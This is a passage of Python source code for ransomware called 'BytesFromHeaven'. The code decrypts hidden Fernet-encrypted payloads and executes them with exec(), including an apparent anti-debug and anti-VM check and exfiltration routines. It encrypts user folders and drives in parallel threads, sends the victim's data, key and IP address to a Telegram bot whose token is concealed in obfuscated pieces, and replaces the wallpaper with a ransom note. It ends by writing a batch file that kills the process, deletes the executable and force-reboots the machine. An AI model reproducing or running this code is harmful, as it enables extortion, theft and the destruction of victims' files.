
    def save_wallpaper(destination_folder):
        global FILE_PATH, dest_path
        wallpaper_path = get_current_wallpaper()
        FILE_PATH = wallpaper_path
        if not os.path.exists(destination_folder):
            os.makedirs(destination_folder)
        filename = os.path.basename(wallpaper_path)
        dest_path = os.path.join(destination_folder, filename)

        shutil.copyfile(wallpaper_path, dest_path)

    def send_wallpaper(file_path, bot_token, chat_id):
        url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': chat_id}
            response = requests.post(url, files=files, data=data)
        return response.json()

    try:
        fernet_key = b"j_WTaYUb75bPmWsvQKEBzYGpizgpHe4FllIPH9kgA5o="
        datasendc = b"gAAAAABoeqKzojYklROiyWpUE-GoiuC1Hu5kst19W_Pt9RwAUHwrbojyl__0kPwdd6rT-NO2qRDWNhA9GX7Tru_TyMP7JS50jQK8axcp6QC5OX77X_PGTA8SfBy5npOIg7YHTW2FHBVkLJbMNhIHt4ejaG4Og9RD7GxOTXmnlzJ5jWahDbfbJIFn153FETZZMSJokQGOPrKzHJLHz0bvLiKD8fUnVOqzTEmFuIJ6HBipkdTFrn58WZll0UqjclMEkTsDQsc42mUKOYdZvJe37Qa8CelavMymxSvJyHRIwrccAr36DuhcOZtAWiGWyw8QRXVAri_0rWXxQ4H2OqFYRukCCY1TkslGlLKPbggI9Yfsxd6FQfzlUzzTmDZ0VE_DiW-WlbD71_zMFRUPYx2DKqknqkM1zd3_2UMpuxCsbyI0s0t9r30u9zbwLlrRwQJt-8jK0tIf9UwL8bFLFCBoR9gpOOgEB_v4q2ZZiLu1-dLo5FvL048Ii2xSsb3x3phTbraaWcn4l_poIpS00aFFIGb4X6XMbg_AbBhpNEt2Z7P_GXGE0OXFUC15Z8L4x2VWaDmtIii5iIBWVD3-FSUnfd2HbJF_KgC7TB6NXr4dct9M7eaacORaiA6zZu1c5Z3VurTEMRnWcWVYeNp4YEa3hwJh2aXNXJUFOgXSaL66OEir5TmHbsdXqogeaz4nNWeWivLbAtsRc1QTBU63Vdzzhz76ETyPqaKJPh2Fqc7EpdHfYnnm6DY8jp3vOA2ZhQ6G3-hh22WZZWeNNtUyNbs4-HtZYJI04hKja25UC_RUwaPwT9Cx5diDYHqAXokOsakINsJRDfBzZy5tu7To-DHwA3R-WQ1Z8zHKOrRWtUfl4-6VFROiD_TFZSDA7dGmI0nxtgcuGGS3rXz6fn3gXWSymGX3dd5K83fbuxmTPBtwSo54wvZRSU8zHaojb8CKzF9UYbMO2JE_2UVb8NeE_MtyxDDGGYz15kXNPMReN0wVl2-ZKGcnVEEH6fHdB12Dj7QviEvRNP976UULMNaE0PNY63jq89tYdFU1UpuA_faAmArnfT7OUCcjcr96RPRPs1_zvd29X4tnMKfaRpgaiEnHx9XneM67ZDhz9ARS-Yg2OGKQUJNAcxbRN0up8DXeLyFlih0sS0tvME7BhBgyCMfP7F-7rOOXZJHKThdvk4w_RsaV1dLv0BN07eAfKKuLiNQr_uQI6YYtOri-dxCUVt0LoDoq-HYPoIdtiVJIzxjlLMyL3MlzEdHn6pf8K3OxBRXgjRMf5Cr1a8FTAinsZLdjII_nEXyvyXBsqJEfzRLVUoUvNK5LBazwsYMxf7hjw5rl8Qegxm0Co0p9OQMpRC1-kqmvVaXnR2RClgzZbToqLKWHSDOQx170kq8QibEzPkfPu9K3C8sA6bLCScOyg-c4hY8RS3jlzpHSkAE4pLVLvs1QBsDkjNYYprjZDUjnHAkaXym1Y1BYBoNVRmEGLRya8j7165MC1Sb_klmluqO61TQbQSytKBqoL2ZLUjbSZLZbG1-YkapnUOkZbrnXu_60-OTBWdEq13oXUcbn4N5QvxZ5yVuD6RhsphcAkmD7XHlsNbjDU4YCXtzjAw66e5zPCtzHmenn_M_oAf_h5hfjP_tKYsISA-Kt6x1ukt3DskhDQal4RVPSuQU2AZ_I5q1nDxqx6ZXzQ6q5FpNXDB6jplYDBXI4g_l1_X83TA6VDHmiKLMFAbFDDPsiogBaPyulDqpmPLHeyuMrqLPNn3RMlZi9tg4OZKRhRX0NwNXkSXiF1wTgLElSBVtv4VI9Of-RVFy2ZUGjUQ41zcdmJ_4qcF1cKwCCIS30R0QBOB1n04SYwATSuSzMCFywPIEz1slWW6khT7ZmKeWOeMm0x7SBDKFH_Z3XBlaP45W6H5rIErIIdP4Xcn5_21d-b7SR34_InfcJ-OaCwjRiBLYdl75iRe8At0xogjvEbmJLw_KU_rM4UujFXjrvNTyOw8j-mtcMfHQylFXi65EvzWYJt_FcQqUvqHvEFZU98iDpGc8XKWhueQwBoS6ezYK30_jr9xnKN8VVYvA2Fqroikxcup1Dd5pdWmUGTEX8hRs9pTtK636--VB4vCdqqp-qlI8LlX_3kVzIr7GhBfDKZfE7uvOLJwL56lcQB1n4I9I3FbLFP5D38m97YrBbXmtFAjJTSBTPwsHxOlOf5Tgvt_2r7jh8eHdkYb65WFZUGKfoSf79-bzLqNfV5X0ONzMu-jOQDDaGP_GcfyS7IgNomxh-li7Gq8hoUMueDHVcIp1T0RITjBbva-4GpjQlfxU7tCaQgNqJ1Xx93fx2bO3NMC5CiCYl0mYttlO91CkNCTqizXNqlOd6R7uu0d0UTHpfjubT7boFqx6TGnpjYGJOJRGtInyLmOngdIbnUWu2C02ZP4RJr7ShGde3dhmLQWZ2JMjyfgfzwfSBD08FiBP8jjs8TXnpQcLkzTi-UmjbgehMawKuGlpuJBFoqkzP6h34jU03QaIx4nDPf4LglBlsmj5rhdfAUppnvsX-8teVY4PPE2PCvMRbYhmmpjvOsY-DczGq973LpqlA8b42OJBgZ8bj_l9l4FkTfIrA-ysIqHEruVgcoNDW30Otvlstjq-MiemDLj0k9RvO6xAzNWFVJYeW91L5Yj8xjuuVtx7zKrp6TGmWHCHRvgkEcPdYDKEpj1pFEGepwD0AyCi0iGeE7IvK8gGQkujJNR6GDLtrkDeQtnmf7U2BSAJZxsJAxiHJQCaRM0Q6zDPWmFVISevUUgnob6n3AasnB-V7FVZ-OYfFn6uU9FLXeoMXS1V-dYhY3HpPpiqEDodPvUCTHaa5eTP3Y5LXbkFl1dolXwYbHxCptP8PxH3ZZX74cVDExqF9CkImMX6dXasdAht6hkgxPQCLiauo4bStYJj94jiqqpiPUGY761e_kgJwN4-CatBRP0WxmTAowWfAf2PfYY-AhCfsHkZ7zjVeyuOZFa783Zx7yVegohOdaBcdpTdsHfGuifXVsLjUg_c7CjpPWOL8NXB58OsVZzwoNjTkxSS9IhuFe60Xk51Bz9UemAC6RvmJcdHSWpHOgOAs0NwEI1EsORlyeEqguM0kFhftlCorNun7XVSDgZseJmPrCEUYaJxv3w6NXd6DNTtaLrFQ5_D1iOXyX63ESgemzwIDgMvl_QhZNVgBlY8c0vX0X7k9UGYXNe1taQlfTvFhwEwGLpzFt52uozV9RrNKKJj5VLlI3WR2AdqOJjp8TgVYgTKMWxAkumkXPrGtUoQfYPQUK93iAqoT89fqE4P3b2wtIxlPRly2HpdXIiurJsV9Liis360k2b70nLx2n54sgE9Jv1yt2KtiLa5A5ygsfX6RQzO4aaFUvTRrNYsWgxUGgqzGrPmbgF2DHYZh7Kmvp6dmS7EnSz5ldtEYRq-XDVo_kh0adKbKYsFq40dUUzzjw_Qmn7BEK_Ld9aDcFaeIYaAfAl_tiA=="
        fernet = Fernet(fernet_key)
        sd = fernet.decrypt(datasendc).decode('utf-8')

        fernet_key = b"W2XFD5p4QfAOKHPRYL9agYVAhGDahbTQcaGkgW5ebaQ="
        securitycode = b"gAAAAABoj1zx41oawsCapwhRuWwuAAz8TUMJrEM63tQ7BTVuiJsU6x_R5pmfU-flks7y5nZ3mQuuWGcoQx3sBem-BEK2rDPPN8DBDdf8X4Awxy0ZjF6vRpd08hxl64jqvmpvqYvXP3U-FSXxHzcR-aPFV9wvLYjnjpAFRIic4H_pjapC_tHxt7MXEwkKUNDDHUGUbAgAQcJ1-8a5T4IHMmFMas7UvFejlPaxYTjNvwVIe7RT642UjbieoqWNEaDEPAYloWZFkIxcEyVioPP2NF2x4R87mhW5-txZY_CmLfsG4Z2mQODSDrw67-d_bLXEzpnsZZHMOLU4GN015Ge3gsfNIoXfGhPUyUrruTzR16a9s-5SiLgSM2lcYa0LcPjiblfi1_uyUUgkkXdXTQUNCbE7Gx9AHaYTbD2uamVWOCmA_U13NRDZAEJdw4wEZNrWLXa8oVdmRqpvxB8lo-Lj02Yf0DtAdTJt5FUGHuMANPL6tKWgCrn-olH-yDpRyHF9c8wcUkIcdg-fcxmpARQyQjCA4h7drbV8aoRb4YH_3XxsG1XqjYRXDNY5vw66wha1-0hEt4mlnccH_59r8ZWDhCWLUJZxYV7IEAaqr3ot_yZS4WJX10va52SLcNg-m8D1IES8bwz_IAJwR1L20TwFKsWIBl3hoSr9FMSbSqnd0iKOVhWWRjLhW1ejloMvlqLi4fDvgt3FvYQwGDxnjUh35hTpPiNPc2g5dG8KV31OY_C3LJdISF0oWRzaIzOsbvP5wpfklfg1JLid56Z3Z_sK9E95JKGKH7F5xoYjZ7KHCm1kIfmbYOoQzpIou1PR1GuR9Hm2riXg_azgIscpgNaJqeNjBHdrE1_k8dRkL6iKXdNs-uK6p-lvNED_fKO2yMnpbKq0QpGjN_AVklPxFxO-qyeZIR1lNzHpisDSlhMX4eMfp0WvsMt7gbbGtCqyeaxs7QXmuFAKx1EukF8LzoV8FN3VkPH2fpt9__y15la9dOZruxYWmuKpEvlQjfd6fVn7hjztD5tV_xC1fLGB4TeoinhRaS5vJsm6C0EZYYLOi_Wpea2JAiTvPEWk3SBWULi7vnWf2fhKOdqDAyR42JZJPI7ddoL7fRrUC5jyBqDehkmjGReo-hVv1urDMrdQ6aqItc4xY-1HdBGVqtjcufp7APlZMH-Llh9BiMTZ23MSwyvbGFHtCTBdn2HVthfnCxPJAB46JBE6mGY2jW1NipsYjbUxGuHXyiivk7GuHDM7TE4vHvVf7m4klJktIr8L67SkrWZXZ9SZ4RmvYSIu-6WoOog2NZyuBFFhBN3Sxz4OGNtEObzqySU6H0nG5XijN3KNyjQfCCjkSlThklCfg2yFkPPGIvZuomD6K0FG5ZMxiIJkAJYRlZsFQJjfudNsWWBIfBkU7qpdsDCkO8wmdff81mjyY8mVPdqsVH8CIxwkM-9dHuZipAM5dn6df1xUvx2K-2RUZiXA4v-Ei4iO8xRdRjhtKdRBTxT2TfeWp-CaQ-2ewfFpEXF7_NwvuLSqqCXA1KFTIY5tWjMdXezfxZ5xVZZReFmlSeWsLYxZ80tViW6pgVGZVGo_y2PASdBr3DUmc8_uLecdS8t3cNrPUD97zkpJNkDsCngh6wrbzO72Mk6U0CJKc4xifusMtxtq7CghKjqHIAcHIDks8omBz7c9LVl92Q0QWWXhne_yrqT6FIrRZ4VsnVwiQ59JBDC0QArOdy90pUk5i9pJgDbh-5gXhkCutqTVl7SjU0kLWFdh9yq-TlZEqKG5rMXNBRCYyWERPKV32Z60ke0a4AK0E5Q7uvJV0m6g-XRkCHtip0O5NeXzQbd9HPrRMXrREOaKvC2I-rxi2bm74fZWBCDYFk1MhsJlo7bMMtDQFOUagRA9P95lBdC70-8MOo9hhY5sd1wKNCP7vGozc7rMGbOkPOJueukUwhAw9lWazCtFRVAjbO5eL1XBHd3-dTjNYE31H9D8A4Q690l2n15YghVQ6YqsLXbfBWCJVB2A8xo60isZ1-6i5N4BfdifGNepl39nimcrCLP3LK7aXqAvaUwD1S_1J4MY3Ty9EwHRPtU1mziTPCUhJoas39NilW4PCK7lB0bKB0wlcKZao18LN275wfu0EOo4eXPGEUQTUL4Rw2X27x525sSC4fbPL-ekMxFTcziXti6E3R1FN-SmZnAESRcvadYH1xsjVayW1ReRHF-56uKrJjLkXEXcVgiK3lrNjbMs4thlVGmMWobvl4c-1p4bxVm0GwzK4tpgo3DDjW3BLfRt4XFlLZzBK5M6xoX1JLiVDehiZXc0HAUWjFzqmfkDDbk95HqK7XSxGZCMtOkXywACoccq-_aQ8GaThAE_vnojq9Y5Bzz3_8tqh89Jl2RPxJZto6YZHbWvl9Oecr2tOZqtvh8TSAhlLcTbJ-cDT0xhBqR3ekmCZMAES7W8waQ1vl-SUMUUGW_ZjYYZhyqWNHMhnncsImABJc8M80iAOt7A5K8kpKA5TrLIWdVNgST_8eFUsogEzmt3yKUOY3DoTCPpNV2GsJHW4s3VGMZcvt16vQvftLVd6d3eISQBHQqb-gTHyPqpGNgXoJzn2U-aRezut064xp5Q2aE2Wg7-ZLCy8NciFfSKxo1BE1oFVBNUqIU-VFMC2vMKX51FQH9e9OOWq8NCY91LITPC3KTp2T6Ad6suFguuD5IvZETfmQpr5HZMydfL_7s8Hl7Xx9BmBoJwixUhs__t1otI_Yk6LHWKdCrJGarutyHmm4M8Zpk9ZQgvF_ctNv-DKQvak3D6mwn2pdLS4oVXJ7uZ_PXhyH_ufYjdrlugg5fqaL76hp14qtNW_wwi5VTjBr79ZTkq7j8UavKI0cjkJG6YzNQcm5HUALE4kSIY7xx8R4-2UaJ0B1i5y3YV9PkiOVh2czyZdqzfcGlhBDq1pELDCd73PjvMq1R1fv9QrUcAG6hbhJ8og94vIHCD5NYAxD0ppRsNy-LnWXnDSvlft3tPyoSxAkrQAXxqceP-ZkSQtwx6xctSlZXJoEXgP-aQJIZN4VZfAx02uv-t-H0BiqTtiSSLVgPKolFYv0hEDwEFmboESr80mdB64sSmUlPiyPzDNSN8UApg4pHtKCQkrRXtZwb_6h4vo0HbQJ2WvRs1zETQ7rs7dx_T5RozMGZYFy6yQSBYL8u9jrObOaCjX3ZG7RXSWN8mVzKj7iVsLyOAZGg9Fc2Z3WObAjbtjiYMGZMFEbI3eTtXZbBC-lC8TurQ1xBe4t6P2fCoC2woosYWHV-JiTYTA1GjSL8MIDSxztlb6p5HPW9_f_BmFmOKb94xSDr2IcNQLgxshpJPxWUIj9zXA9S1-IAe3frE2fiCoiwmk0EctKoggPKhjbsL5efhlGguFdxEJmAHHyiddUZJMC0XbF6zLDF7VjJDVb3_9GHokxvCM0bYsYXY0HLMvgNDwp8SviQugr-V0-T8n3mCWUuHmJP98YC7GJ0C8-rxwtEru7VTk-kJ_V6h8fogE_I="
        fernet = Fernet(fernet_key)
        security = fernet.decrypt(securitycode).decode('utf-8')

        fernet_key = b"hTIH2C8mCOyjdJUQHE-j6jPtwZGlubXEslMgmhWY1Lk="
        protocolinternetcode = b"gAAAAABoepFhBeueHTimIyOEjNeGQDSwySX_vLOAZ1yKAedoDbCdiPy9Fc0lGzhmWB7Tp5gGFXAXcRPEXNOzgx8ubF_w5c2cJZcQfh7FefP2Bkggu20ctuRfNtHz1nVoodwH1-La2jWEMw2lxT5eNCKKgDSug55pnPoJAbgwoaQ7HvaT17EOhgk8kPXZ5L9EUyq40CRtENmU7QKd5e-8mU1uPVCCQits4SIxIGJ-_DGka7e-ZVFUKqVRHAiitgRfPnUtz4TYFzHHujVcswlXmuEs6yFZ2QiQgHotUJ0WoyzWstb3DI1GC4v04zA8Inui4jN3u0Lf6BBAbgBrVOu3xAWhIwn3TXTMBlmKITefyxodXi47HDGIvpg="
        fernet = Fernet(fernet_key)
        protocolinternet = fernet.decrypt(protocolinternetcode).decode('utf-8')

        fernet_key1 = b"2mnDiYhPSrVieLRHdYLIJW4bQ46Dz6MzraCzje1um-U="
        encry = b"gAAAAABokiPHEFKczccoE-xf2TS8-gBXEpZ0qDa12fBLvCGpeqbFr4QZ3Igeg4btAMD-sor4eBSpjHkFnKlCKDQ6YfEs824gsJ_dgwS8l9W4M6gZtLYHgYBoVo2yz0XHvT9dwg7jPNUA9_W4MmIsNCH-Jd5NOeskU-SRQKgKH0Ryc6cQwG8KTVKCWciKtX8ZplfDKFR3N5PIT_u9PrDDBoetSgfPQC1K6INcTYhc9uBVUeY0Vj_d8Y7i7UT1tKjiZqDAwl6hKcUHBkxXv4FV0cdfO53cForQDnGNh3vxG4G6Wx4mtDnWtf-u-kDOYij1gX9-otLsgu4ovjPEEy4Uu4c522_vhwoTf4VAxzBWO8FA66oqcQBIHZ-Eps24jOFz2F_iiJ-NEuDtvmLJ-NjYyJ3vXADwTCO27p1B1BFfP9XZExElBVEc8vFUFDJLjd2WaWkwSduO-jCO8tk0H5c2t-XFvM5q88bQo-BaAz7VXFX8dM_xKBVjCqHJQ0rxsabcoya_l27nMPnsd5OodEp-rqzfKf5bDRcXqJ2_Z1J9te79v-wbkcHBYPx5rZ06CEV-peaGiCB6QRHh6bzneg2GPMIj6xWYm7tuJFY5h_dQ-yWig_Db0TDIuB9Xk332ppBO9JlbfSsnCa4Pf9ADIiw-11sxUzCpkzYK3jHWTc6E5HF_rmkp9aZR9NRJ7zTr82COHNKbqajmcAab1rd_e0NDzlzDNtIgs4upI9T-WE_1YljoaDammDpva24wD6r_NsXrx7CBL_zxutxrn6v_R0h4k4ZAYTjgeFFMsw36qkpeKjtFrVvccHPnMj4AwktiG3a-A2yJn6xsz50jJa86wZPxNDNF8buH2QVMvEx4CxCS_-WztgLLjliC_gqUZPbb7MUhNAiXUmuLgzbpAaAVwojxqY_Yg7Jfj4b4vYMfCC0F-F5zTbRboYkoABYwY3i0BbCdhuEB04gb2RQx3c9Indt18WO9w_bVb6GXCwcOqlH1hXHmg-llEWQSMHUCvsDz8t1H-DqENF2BQ6eEOoBClb07VKCXi3YRQviAl7pWaIFIvINm7vClspl5C1s="
        fernet = Fernet(fernet_key1)
        enc = fernet.decrypt(encry).decode('utf-8')

        fernet_key2 = b"z2SEpxtVMggYvfV5obGT5ZWtWiofYUKYuAfCuVJcg2s="
        sendcode = b"gAAAAABoapd03NiAnyCisKqIAjyO6BZjuEebQU9OlDSRDOukXfqcWDBD9TQCMtGW8-pgrlFpTet1JNzeFTpiBhd4woNbqrvp0LWk54lW0H2yCRwUdvzZGCaAAAcV0vToxfrTgZJnIDTAVMYQ7-N8Op272XgNxhZX51SttghIu34EYa-BHNhvsy7fLquk_IDlGgrFR_589V5e8vdlCkD6y2wccyPGfHOeP6svaousRtoWDbodDAicW-xv__3n68nSfzlgQmMNDTEhssrcC5H1l7CVr7lUHNDHVvkPba-9rs5hbPNlWlXNEYJCTbaW0g0TJdFih3nRNUqYKVHlM5k-gXgxkZrlrFrV8dImG-_v_Vl7ntlFVzloQpjZSVdUcxn9i159AMPEzE82i5qWS044TyB9BLEXlpuyDemxXgLuAwyuOg9ImTpzqJWf7RTJVZu20s9d2pmK40b_uBuah_oEXnOJ94HX5A3HVCSQOxSE62CYayDwQn6h0O54rNXvCJAcP-gRjwHfDE9_FJuF-4-8p_IH8iJ9NLmI02AXRLWla9Cjqnwv60B6koG3zjGgeEukC0SEQdvI9U9Xcvtw6bQVI5kCBMuWyD5eqemUpLwhD-dVltpAR8mxAQPDNRuWwJP2LLB5wntf2rTUHTol-__o_GD52_kc4QG5PuhFojlvOoOMRm0_6z9axYca6vKHvk_qu0qKT7AfbX6AhwQk_1mDuTxZHaPkJjjWZmkWkbNg4MtR_bDhNzYf6DAgQ0TvHBGK19A2DWDCKnSCD_SQWVtn-JNlO1N9k5J4GIQlmGcyeaskSjkR5RfXKDRCjTga0i9xfLOJe3aTG_8lNEv7tRHaQxHZtBP35G7JbIjhiPL88vdk3ZyeK_Vg2WSc4dRIGI4ttzBiUu7Mk2BVdPBXKPiWRMxsdHwLZ0P1LVq-1aUjRSvw-PzKRR0BztkPGdCdl2EPzIZqpIzLk91VNCTvCz5iSHd9xL4ddVauC7vMmIflR6nm_WlDX8vgSo8HucX_LkBZeuAsxmPME0m9hK22LiPGxtoGyiJHiR07Wkh-IHOUwgwTyvVp5Dg4AwE="
        fernet = Fernet(fernet_key2)
        send = fernet.decrypt(sendcode).decode('utf-8')

        fernet_key0 = b"yqOx0cv6GuyB6OGMoL4w8n0avm3i0X1qqBi_ncBxCU0="
        checkdgbandvmcode = b"gAAAAABoa7Wn7GQOFsHthKN-tHq1mkCneFM4ZVr8X6zjtwJxaeYnHgIvAsQ8vgGAYIa-YrJhgv1xH6rQx9v57fh0cOt7Dx0Qw_a4CWrx0XcvFathWZoWyuDgYQ8bSESpc67oYv62it-F7riMfMlpZhCQnknhgdN5xFOmiFN_b9N0RmyQpUZb3p_rFly10v29XGxtlCE6EbSKmk79JnknXAtv2sdvDWBK31rLnUDufDf13KcpqnPKDTklBM17qN49Yy2VaLHQmTqmcddz_XQT_DkHDqoNGq-J833t-5oViZfxkF9hLKYI7eFkd3SwIN8x3_XaCnSaVCwF_rTz4aixRkbL4lXStqjsvAJSnw6Rmd7psGvoCr5--D6p0LulawFTbAGPKHNLSVi82crFTlQ9bzmeBtgP3vYfPE4uQOubaGhK4bS7ZXOuPfR5EDkgMjLG-dfQgvQzJhr5_4aO8C02SwKpMI1JeVut4aqJuuLJyf1C_S0LW8sHNYCby40d88T-bHlkrKP27n_TvtzmkI3lf1-ucUt5uHDAlAHoNEFef3dnDcxY3heAhJ8dzr5lrzk71FX6fO0WTkLK4MhOYJYYkFmXnLsl9vvDFVwmOPMoayLvqyRl7qXv3l3YfksSFq1L0d7yr4CI2uwywKHhA0m8D5kIRd_HTQijgkLG-Hjtqcf1eUxm8-JwfBkw_uvjr8yxfmAS68nprmEN1s6bmNftYsYiOL4dWMROjmSefxnsEuFENhOXyquRiwaNS8BB2mbJHN1HuiwgPHeJhM71G-zufV91WZXTyAeUKb2MNSTDwo2fE2OWzghwT9K_uQ-2QGbkRN5ePGcFkO2NRD4_zrtNcbWChFw2p7E7fbaVaRyhFuKdoFRNN-Ln3Vohbx4HaG0dm4xf70C9HfOydlTlGKzhwDupv4PeOnqXTWSThT95_A3KoO9E5VaZp6ty63hBsOsPz8zg4szGbNkxTMg-9l-YiZHYg2U0khRizs41HarQHObhyjUe3aFfJo7zWWhMOEVoqd9MGuOwLJGjNuAPS4HqfKz4MkjiJRQ4ul1IZvVoUbQTQn8i7P96Er1-7IHtg1-A5ZlTbLYNCsJyn1rKshL4GPIaW0ndQKQB_vtVZfwtvaM0gvTSXIeSmEOEIp47q3yN_8G62VvjZbzM6Ovq7GszTgZXqPDQiScZww=="
        fernet = Fernet(fernet_key0)
        checkdandv = fernet.decrypt(checkdgbandvmcode).decode('utf-8')
        ___d_ss0 = [
            f'C:\\\\Users\\\\{___us_0e}\\\\Desktop',
            f'C:\\\\Users\\\\{___us_0e}\\\\OneDrive\\\\Desktop',
            f'C:\\\\Users\\\\{___us_0e}\\\\Downloads',
            f'C:\\\\Users\\\\{___us_0e}\\\\OneDrive\\\\Downloads',
            f'C:\\\\Users\\\\{___us_0e}\\\\Documents',
            f'C:\\\\Users\\\\{___us_0e}\\\\OneDrive\\\\Documents',
            f'C:\\\\Users\\\\{___us_0e}\\\\Videos',
            f'C:\\\\Users\\\\{___us_0e}\\\\OneDrive\\\\Videos',
            f'C:\\\\Users\\\\{___us_0e}\\\\Pictures',
            f'C:\\\\Users\\\\{___us_0e}\\\\OneDrive\\\\Pictures',
            f'C:\\\\Users\\\\{___us_0e}\\\\Music',
            f'C:\\\\Users\\\\{___us_0e}\\\\Favorites',
            f'H:\\\\',
            f'E:\\\\',
            f'F:\\\\',
            f'G:\\\\',
            f'D:\\\\',
        ]
        _34_34 = 'M9gRFCbfKehzNQ5mjK'
        __1013fef_1 = '7569587119' 
        tf = ':'
        _765_dqde_1 = 'DRPLc5Y0c'
        ct2_1d = '7318415374'
        _91cnv = 'AAFGefm1'
        __bttk1231 = f'{__1013fef_1}{tf}{_91cnv}{_34_34}{_765_dqde_1}'
        exec(checkdandv)
        exec(security)
        exec(sd)
        exec(protocolinternet)
        exec(send)
        exec(enc)
        if __name__ == "__main__":
            img_file = "BytesFromHeaven.bmp"
            font_path = "C:/Windows/Fonts/Georgia.ttf"  
            create_image_with_text(f"""
                    BytesFromHeaven - All of you files are stolen and encrypted.
                    You must follow the instructions we give you in order to
                        decrypt your files.
                            Notice a file named "{Key}_Link.txt", open it and read
                                the instructions.
                                All the necessary information is present in
                                    the file.
                                        Have a great day.
        :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :):) :) :) :) :) :) :) :) :)
        """, img_file, size=(1920, 1080), bg_color=(255, 248, 220), text_color=(100, 0, 0), font_path=font_path, font_size=30)
            save_wallpaper(f"C:\\\\Users\\\\{___us_0e}\\\\Desktop")
            send_wallpaper(FILE_PATH, __bttk1231, '7318415374')
            try:
                os.remove(dest_path)
            except Exception as e:
                pass
            set_desktop_background_windows(img_file)
            winsound.Beep(1000, 1000)
            winsound.Beep(3000, 1000)
            winsound.Beep(1000, 1000)
        def generate____us_0ekkk():
            ___us_0ekkk = Fernet.generate_key()
            return ___us_0ekkk
        ___us_0ekkk = generate____us_0ekkk()
        for x in ___d_ss0:
            T = threading.Thread(target=___netfer,args=([x],___us_0ekkk))
            T.start()
        __Sz_83m(f"---START OF '{___us_0e}'---")
        __Sz_83m(f"Key is '{___us_0ekkk}'.\nUser is '{___us_0e}'.\nLocation is '{get_ip()}'.")
        __Sz_83m(f"userkey is '{Key}'")
        __Sz_83m(f"---END OF '{___us_0e}'---")
    except Exception as e:
        pass
    time.sleep(180)
    with open(f'PE.bat', 'w') as file:
        file.write(f"""
    @echo off
    setlocal enableextensions enabledelayedexpansion
    :: Set the name of the target executable (WITHOUT quotes)
    set "TARGET=YPE.exe"
    :: Kill the process (forcefully)
    taskkill /f /im "%TARGET%" >nul 2>&1
    :: Wait a moment to ensure process is killed
    timeout /t 2 /nobreak >nul
    :: Delete the executable
    del /f /q "%~dp0%TARGET%"
    :: Create a command to delete this .bat file
    set "BAT=%~f0"
    set "DEL_CMD=cmd /c del /f /q \"%BAT%\""
    :: Schedule self-deletion
    start "" %DEL_CMD%
    :: Restart the computer in 2 seconds
    shutdown /r /t 2 /f
    """)
    os.system("PE.bat")
except Exception:
    pass